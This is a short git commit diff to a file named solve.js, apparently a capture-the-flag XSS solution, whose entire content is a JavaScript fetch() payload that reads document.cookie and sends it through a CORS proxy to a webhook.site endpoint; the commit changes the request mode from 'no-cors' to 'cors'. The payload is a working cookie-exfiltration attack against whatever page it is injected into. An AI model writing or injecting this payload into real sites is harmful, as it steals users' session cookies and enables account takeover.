3c738224dd9c4993b8c7e3969f77226c9772fc0d
Theory <51336409+7h30ry@users.noreply.github.com>
2025-05-03 13:06:09 +0100

    Update solve.js

--- solve.js
+++ solve.js
@@ -1,5 +1,5 @@
 fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884?c=' + document.cookie, {
   method: 'GET',
-  mode: 'no-cors',
+  mode: 'cors',
   credentials: 'include'
 });
